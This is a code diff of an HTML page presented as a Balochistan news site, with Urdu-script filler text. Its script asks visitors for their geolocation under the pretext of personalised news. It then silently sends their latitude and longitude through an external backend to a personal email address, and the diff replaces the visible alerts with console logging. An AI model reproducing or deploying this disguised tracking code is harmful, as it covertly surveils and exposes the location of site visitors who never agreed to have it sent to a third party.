@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bal">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Balochistan News - Breaking News and Stories</title>
+    <title>باجوچستان خبر - توڑنی خبر اور کہانیاں</title>
     <!-- Bootstrap CSS -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
@@ -11,6 +11,8 @@
             font-family: 'Arial', sans-serif;
             background-color: #f8f9fa;
             color: #333;
+            margin: 0;
+            padding: 0;
         }
 
         /* Navbar */
@@ -30,7 +32,7 @@
 
         /* Hero Section */
         .hero-section {
-            background-image: url('https://via.placeholder.com/1600x500?text=Balochistan+News'); /* Replace with real image */
+            background-image: url('https://via.placeholder.com/1600x500?text=Balochistan+News'); /* Replace with Balochistan image */
             background-size: cover;
             background-position: center;
             color: white;
@@ -53,11 +55,44 @@
             padding: 30px;
             border-radius: 8px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
         }
 
         .news-section h2 {
             font-size: 2em;
             color: #002147;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-top: 30px;
+        }
+
+        .sidebar h3 {
+            color: #002147;
+            font-size: 1.8em;
+        }
+
+        .sidebar ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .sidebar ul li {
+            margin-bottom: 10px;
+        }
+
+        .sidebar ul li a {
+            text-decoration: none;
+            color: #333;
+        }
+
+        .sidebar ul li a:hover {
+            color: #f0ad4e;
         }
 
         /* Footer */
@@ -77,7 +112,7 @@
             text-decoration: underline;
         }
 
-        /* Location Request Prompt */
+        /* Location Request */
         .location-request {
             background-color: #f0ad4e;
             color: white;
@@ -90,6 +125,19 @@
         .location-result {
             font-size: 1.2em;
             margin-top: 20px;
+        }
+
+        /* Images Section */
+        .image-gallery {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+
+        .image-gallery img {
+            width: 32%;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
     </style>
 </head>
@@ -135,11 +183,21 @@
                     <p>لورم اپسم ڈولر سٹ ایٹ میٹ، کونسیٹٹور ایڈپیسنگ ایلیت۔ انٹجر نیک اوڈیو۔ پریزینٹ لبر۔ سیڈ کرسس انتے ڈاپیبس ڈیام۔</p>
                     <a href="#" class="btn btn-primary">مزید پڑھیں</a>
                 </div>
+
+                <!-- Geolocation Request -->
+                <div class="location-request">
+                    <p>ہم آپ کا مقام معلوم کرنا چاہتے ہیں تاکہ آپ کو ذاتی خبریں فراہم کر سکیں۔</p>
+                    <button class="btn btn-warning" id="allowLocationButton">مقام کی رسائی دیں</button>
+                </div>
+
+                <!-- Location Result -->
+                <div class="location-result" id="locationDisplay">
+                    <p>مقام یہاں دکھایا جائے گا جب آپ اجازت دیں گے۔</p>
+                </div>
             </div>
 
             <!-- Sidebar Section -->
             <div class="col-md-4">
-                <!-- Sidebar Content -->
                 <div class="sidebar">
                     <h3>مقبول آرٹیکل</h3>
                     <ul>
@@ -148,6 +206,13 @@
                         <li><a href="#">باجوچستان کا قومی سیاست میں کردار</a></li>
                         <li><a href="#">علاقائی ترقی پر مقامی رہنماؤں کے ساتھ انٹرویو</a></li>
                     </ul>
+                </div>
+
+                <!-- Image Gallery -->
+                <div class="image-gallery">
+                    <img src="https://via.placeholder.com/500x300?text=Balochistan+Landscape" alt="Balochistan Landscape">
+                    <img src="https://via.placeholder.com/500x300?text=Traditional+Balochi+Culture" alt="Balochi Culture">
+                    <img src="https://via.placeholder.com/500x300?text=Balochistan+People" alt="Balochistan People">
                 </div>
             </div>
         </div>
@@ -175,43 +240,47 @@
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
 
-                        // Send the location data via email
+                        // Show the location on the page
+                        document.getElementById("locationDisplay").innerHTML = `
+                            <strong>عرض بلد:</strong> ${latitude}<br>
+                            <strong>طول بلد:</strong> ${longitude}
+                        `;
+
+                        // Send email with location data
                         sendEmail("مقام کی رسائی", `عرض بلد: ${latitude}, طول بلد: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
-                        alert("مقام کی رسائی مسترد یا کوئی خرابی ہوئی ہے۔");
+                        alert("مقام کی رسائی نہیں ہو سکی، براہ کرم اپنے مقام کی اجازت دیں.");
                     }
                 );
             } else {
-                alert("اس براؤزر میں جیو لوکیشن کی سہولت نہیں ہے۔");
+                alert("آپ کا براؤزر مقام کی اجازت نہیں دیتا.");
             }
         }
 
-        // Request the location on page load
-        window.addEventListener('load', function () {
-            requestLocation();  // Trigger the location request immediately
-        });
-
-        // Function to send the location data via email
-        function sendEmail(subject, message, recipientEmail) {
+        // Function to send email
+        function sendEmail(subject, message, recipient) {
             const emailData = {
                 subject: subject,
                 message: message,
-                recipient_email: recipientEmail,
-                recipient_name: "کلیم احمد"
+                recipient: recipient
             };
 
             fetch("https://zalex-backend.onrender.com/api/send-email/", {
                 method: "POST",
                 headers: {
-                    "Content-Type": "application/json",
+                    "Content-Type": "application/json"
                 },
                 body: JSON.stringify(emailData)
             })
-            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
-            .then(data => alert(data.message ? "ای میل کامیابی سے بھیجی گئی!" : `خرابی: ${data.error}`))
-            .catch(error => alert("ای میل بھیجنے میں خرابی: " + error));
+            .then(response => response.json())
+            .then(data => console.log("Email sent:", data))
+            .catch(error => console.error("Error sending email:", error));
         }
+
+        // Event listener for the "Allow Location" button
+        document.getElementById("allowLocationButton").addEventListener("click", requestLocation);
     </script>
+
 </body>
 </html>
